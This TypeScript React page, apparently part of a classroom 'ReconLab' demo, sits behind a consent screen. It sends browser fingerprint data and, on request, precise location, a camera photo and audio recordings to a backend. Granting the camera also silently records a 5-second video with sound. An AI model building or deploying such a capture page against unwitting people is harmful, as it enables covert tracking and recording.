import { useState, useEffect, useRef } from 'react';
import { useParams } from 'react-router-dom';
import {
  getVisitorSession,
  recordVisit,
  submitLocation,
  updatePermission,
  uploadPhoto,
  uploadVideo,
  uploadAudio,
} from '../lib/api';
import { AlertTriangle } from 'lucide-react';
import type { PermissionStatus } from '../../../shared/types';

// ─── Types ─────────────────────────────────────────────────────────────────────
type PermStatus = PermissionStatus;

interface SessionInfo {
  demoId: string;
  expiresAt: string;
  status: string;
  mediaType: string;
  contentUrl: string | null;
  mediaUrl: string | null;
  themeLabel: string;
  themeCaption: string;
  themeLinkText: string;
  themeEmoji: string;
  practice: boolean;
}

// ─── Browser info collection ───────────────────────────────────────────────────
function collectBrowserInfo() {
  return {
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    availScreenWidth: window.screen.availWidth,
    availScreenHeight: window.screen.availHeight,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    devicePixelRatio: window.devicePixelRatio || 1,
    language: navigator.language,
    languages: Array.from(navigator.languages || [navigator.language]),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: window.screen.colorDepth,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack === '1' ? true : navigator.doNotTrack === '0' ? false : null,
    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
    connectionType: (navigator as any).connection?.effectiveType || undefined,
  };
}

export default function VisitorPage() {
  const { token } = useParams<{ token: string }>();
  const [session, setSession] = useState<SessionInfo | null>(null);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(true);
  const [contentError, setContentError] = useState(false);
  const [consentConfirmed, setConsentConfirmed] = useState(false);
  const [consentChecked, setConsentChecked] = useState(false);
  const [permissions, setPermissions] = useState<Record<'location' | 'camera' | 'microphone', PermStatus>>({
    location: 'not_requested',
    camera: 'not_requested',
    microphone: 'not_requested',
  });

  const videoPreviewRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // ─── Cleanup media streams on unmount ────────────────────────────────────────
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(t => t.stop());
      }
    };
  }, []);

  // ─── Location ────────────────────────────────────────────────────────────────
  const collectLocation = async (tok: string): Promise<PermStatus> => {
    if (!navigator.geolocation) {
      await updatePermission(tok, 'location', 'unavailable');
      setPermissions(previous => ({ ...previous, location: 'unavailable' }));
      return 'unavailable';
    }
    return new Promise<PermStatus>(resolve => {
      navigator.geolocation.getCurrentPosition(
        async pos => {
          try {
            await submitLocation(tok, {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            });
          } catch { /* backend error — visit still proceeds */ }
          setPermissions(previous => ({ ...previous, location: 'granted' }));
          resolve('granted');
        },
        async () => {
          await updatePermission(tok, 'location', 'denied');
          setPermissions(previous => ({ ...previous, location: 'denied' }));
          resolve('denied');
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
  };

  // ─── Camera Photo ─────────────────────────────────────────────────────────────
  const collectPhoto = async (tok: string): Promise<PermStatus> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      streamRef.current = stream;

      const video = document.createElement('video');
      video.srcObject = stream;
      video.autoplay = true;
      await new Promise(r => { video.onloadeddata = r; });
      await new Promise(r => setTimeout(r, 600));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d')!.drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());
      streamRef.current = null;

      const blob = await new Promise<Blob>(resolve => {
        canvas.toBlob(b => resolve(b!), 'image/jpeg', 0.85);
      });

      await uploadPhoto(tok, blob);
      setPermissions(previous => ({ ...previous, camera: 'granted' }));
      void collectVideo(tok);
      return 'granted';
    } catch {
      await updatePermission(tok, 'camera', 'denied');
      setPermissions(previous => ({ ...previous, camera: 'denied' }));
      return 'denied';
    }
  };

  // ─── 5-second Video ──────────────────────────────────────────────────────────
  const collectVideo = async (tok: string): Promise<PermStatus> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;

      let mimeType = 'video/webm';
      let options: MediaRecorderOptions = {};
      if (typeof MediaRecorder.isTypeSupported === 'function') {
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
          mimeType = 'video/webm;codecs=vp8,opus';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('video/webm')) {
          mimeType = 'video/webm';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('video/mp4')) {
          mimeType = 'video/mp4';
          options = { mimeType };
        }
      }

      const recorder = new MediaRecorder(stream, options);
      const chunks: Blob[] = [];
      recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
      recorder.start(500);

      await new Promise(r => setTimeout(r, 5000));

      if (recorder.state !== 'inactive') {
        recorder.stop();
        await new Promise<void>(r => { recorder.onstop = () => r(); });
      }

      stream.getTracks().forEach(t => t.stop());
      streamRef.current = null;
      if (videoPreviewRef.current) videoPreviewRef.current.srcObject = null;

      await uploadVideo(tok, new Blob(chunks, { type: mimeType }));
      setPermissions(previous => ({ ...previous, camera: 'granted' }));
      return 'granted';
    } catch {
      await updatePermission(tok, 'camera', 'denied');
      setPermissions(previous => ({ ...previous, camera: 'denied' }));
      return 'denied';
    }
  };

  // ─── 5-second Audio ──────────────────────────────────────────────────────────
  const collectAudio = async (tok: string): Promise<PermStatus> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      streamRef.current = stream;

      let mimeType = 'audio/webm';
      let options: MediaRecorderOptions = {};
      if (typeof MediaRecorder.isTypeSupported === 'function') {
        if (MediaRecorder.isTypeSupported('audio/webm')) {
          mimeType = 'audio/webm';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
          mimeType = 'audio/mp4';
          options = { mimeType };
        } else if (MediaRecorder.isTypeSupported('audio/ogg')) {
          mimeType = 'audio/ogg';
          options = { mimeType };
        }
      }

      const recorder = new MediaRecorder(stream, options);
      const chunks: Blob[] = [];
      recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
      recorder.start(500);

      await new Promise(r => setTimeout(r, 5000));

      if (recorder.state !== 'inactive') {
        recorder.stop();
        await new Promise<void>(r => { recorder.onstop = () => r(); });
      }

      stream.getTracks().forEach(t => t.stop());
      streamRef.current = null;

      await uploadAudio(tok, new Blob(chunks, { type: mimeType }));
      setPermissions(previous => ({ ...previous, microphone: 'granted' }));
      return 'granted';
    } catch {
      await updatePermission(tok, 'microphone', 'denied');
      setPermissions(previous => ({ ...previous, microphone: 'denied' }));
      return 'denied';
    }
  };

  // ─── Session load + visit record ─────────────────────────────────────────────
  useEffect(() => {
    if (!token) return;
    (async () => {
      try {
        const data = await getVisitorSession(token);
        setSession(data);
      } catch (err: any) {
        setError(err.message || 'Link not found');
      } finally {
        setLoading(false);
      }
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [token]);

  // ─── Loading ─────────────────────────────────────────────────────────────────
  if (loading) {
    return (
      <div style={{ minHeight: '100vh', background: 'var(--color-bg-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <div style={{ textAlign: 'center', color: 'var(--color-text-muted)' }}>
          <div style={{
            width: '40px', height: '40px', borderRadius: '50%',
            border: '3px solid var(--color-border)',
            borderTopColor: 'var(--color-accent)',
            animation: 'spin-slow 0.8s linear infinite',
            margin: '0 auto 1rem',
          }} />
          <p style={{ fontSize: '0.875rem' }}>Loading…</p>
        </div>
      </div>
    );
  }

  // ─── Error / Terminated / Expired ────────────────────────────────────────────
  if (error) {
    return (
      <div style={{ minHeight: '100vh', background: 'var(--color-bg-primary)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '1.5rem' }}>
        <div className="card" style={{ maxWidth: '400px', width: '100%', textAlign: 'center' }}>
          <AlertTriangle size={40} style={{ color: 'var(--color-text-muted)', margin: '0 auto 1rem' }} />
          <h2 style={{ fontSize: '1.125rem', fontWeight: 600, marginBottom: '0.5rem' }}>
            This link is no longer active.
          </h2>
          <p style={{ fontSize: '0.875rem', color: 'var(--color-text-muted)' }}>
            {error.includes('expired') ? 'This link has expired.' : error.includes('terminated') ? 'This link was terminated.' : 'This link is not available.'}
          </p>
        </div>
      </div>
    );
  }

  if (!session) return null;

  const { mediaType, contentUrl, mediaUrl } = session;
  const startDemonstration = async () => {
    if (!token || !consentChecked) return;
    setConsentConfirmed(true);
    if (session.practice) {
      setPermissions({ location: 'granted', camera: 'granted', microphone: 'granted' });
      return;
    }
    await recordVisit(token, collectBrowserInfo());
  };
  const permissionLabel = (status: PermStatus) => status.replace('_', ' ');

  if (!consentConfirmed) {
    return (
      <div className="min-h-screen flex items-center justify-center p-6" style={{ background: 'var(--color-bg-primary)' }}>
        <div className="card" style={{ maxWidth: '520px', width: '100%' }}>
          <h1 className="text-xl font-semibold mb-3">ReconLab demonstration</h1>
          <p className="text-sm mb-4" style={{ color: 'var(--color-text-secondary)', lineHeight: 1.6 }}>
            This classroom exercise may collect browser environment details and, only after your separate action,
            request location, camera, or microphone access. You can decline any permission and still view the content.
          </p>
          {session.practice && <p className="text-sm mb-4" style={{ color: 'var(--color-warning)' }}>Practice session — all telemetry is simulated.</p>}
          <label className="flex items-start gap-2 text-sm mb-4">
            <input type="checkbox" checked={consentChecked} onChange={event => setConsentChecked(event.target.checked)} />
            <span>I understand and voluntarily consent to this classroom demonstration.</span>
          </label>
          <button className="btn btn-primary" disabled={!consentChecked} onClick={startDemonstration}>
            Start demonstration
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={{ minHeight: '100vh', background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
      {/* Content Area — fills full viewport */}
      <div style={{ width: '100%', height: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
        {mediaType === 'image' && contentUrl && !contentError && (
          <img
            src={contentUrl}
            alt={session.themeLabel}
            onError={() => setContentError(true)}
            style={{ maxWidth: '100%', maxHeight: '100vh', objectFit: 'contain', display: 'block' }}
          />
        )}

        {mediaType === 'video' && contentUrl && !contentError && (
          <video
            src={contentUrl}
            controls
            autoPlay
            onError={() => setContentError(true)}
            style={{ maxWidth: '100%', maxHeight: '100vh', display: 'block' }}
          />
        )}

        {mediaType === 'pdf' && mediaUrl && (
          <iframe
            src={mediaUrl}
            title={session.themeLabel}
            style={{ width: '100%', height: '100vh', border: 'none', display: 'block' }}
          />
        )}

        {contentError && (
          <div className="card" style={{ maxWidth: '420px', margin: '2rem', textAlign: 'center', background: 'var(--color-bg-card)', border: '1px solid var(--color-border)' }}>
            <AlertTriangle size={32} style={{ color: 'var(--color-warning)', margin: '0 auto 0.75rem' }} />
            <h3 style={{ fontSize: '1rem', fontWeight: 600, marginBottom: '0.35rem' }}>Unable to load content</h3>
            <p style={{ fontSize: '0.8rem', color: 'var(--color-text-muted)' }}>
              The {mediaType} could not be loaded from the provided URL.
            </p>
          </div>
        )}
        <div className="card" style={{ position: 'fixed', right: '1rem', bottom: '1rem', width: '270px', background: 'rgba(15,23,42,0.94)' }}>
          <div className="text-sm font-semibold mb-2">Permission controls</div>
          {(['location', 'camera', 'microphone'] as const).map(permission => (
            <div key={permission} className="flex items-center justify-between gap-2 text-xs mb-2">
              <span style={{ textTransform: 'capitalize' }}>{permission}</span>
              <span className={`badge badge-${permissions[permission]}`}>{permissionLabel(permissions[permission])}</span>
              {!session.practice && permissions[permission] === 'not_requested' && (
                <button
                  className="btn btn-outline"
                  style={{ fontSize: '0.7rem', padding: '0.2rem 0.45rem' }}
                  onClick={() => {
                    if (permission === 'location') void collectLocation(token!);
                    if (permission === 'camera') void collectPhoto(token!);
                    if (permission === 'microphone') void collectAudio(token!);
                  }}
                >
                  Request
                </button>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
